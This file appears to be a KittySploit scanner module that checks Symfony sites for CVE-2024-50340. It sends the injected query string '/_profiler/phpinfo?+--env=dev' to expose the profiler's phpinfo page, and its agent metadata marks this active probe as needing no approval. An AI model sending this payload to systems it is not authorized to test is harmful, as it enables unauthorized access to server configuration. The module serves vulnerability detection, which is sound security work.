#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""symfony/runtime is a module for the Symphony PHP framework which enables decoupling PHP applications from glob."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Symfony Profiler - Remote Access via Injected Arguments Detection',
        'description': 'symfony/runtime is a module for the Symphony PHP framework which enables decoupling PHP applications from global state. When the `register_argv_argc` php directive is set to `on` , and users call any URL with a special crafted query string, they are able to change the environment or debug mode used by the kernel when handling the request. As of versions 5.4.46, 6.4.14, and 7.1.7 the `SymfonyRuntime` now ignores the `argv` values for non-SAPI PHP runtimes.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'symfony', 'phpinfo', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/symfony/symfony/commit/a77b308c3f179ed7c8a8bc295f82b2d6ee3493fa',
            'https://github.com/symfony/symfony/security/advisories/GHSA-x8vp-gf4q-mw5j',
            'https://blog.nollium.com/cve-2024-50340-remote-access-to-symfony-profiler-via-injected-arguments-d2f14b4f6ad7',
            'https://github.com/nollium/CVE-2024-50340-eos-exploit',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-50340',
        ],
        'cve': 'CVE-2024-50340',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        path = '/_profiler/phpinfo?+--env=dev'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('PHP Extension', 'PHP Version',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='Symfony Profiler - Remote Access via Injected Arguments detected', path=path)
            return True
        return False

